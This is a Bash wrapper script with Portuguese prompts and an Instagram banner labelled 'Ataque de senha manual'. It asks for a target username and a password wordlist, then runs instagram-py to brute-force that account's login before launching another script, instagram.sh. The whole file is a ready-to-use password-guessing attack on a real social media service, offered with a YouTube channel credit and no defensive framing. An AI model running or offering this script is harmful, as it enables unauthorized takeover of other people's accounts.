#wordlist seleção
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
   
 _           _                                  
(_)         | |                                 
 _ _ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___  
| | '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \ 
| | | | \__ \ || (_| | (_| | | | (_| | | | | | |
|_|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                       __/ |                    
                      |___/                     

              [#] Ataque de senha manual [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By Gilmar FILHO<< \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Gilmar Francisco Dos Santos Filho \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Insira a localização da lista  : " inspass
echo
if [[ $inspass = 0 ]]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
cd $HOME
fi
cd $HOME/instagram
bash instagram.sh
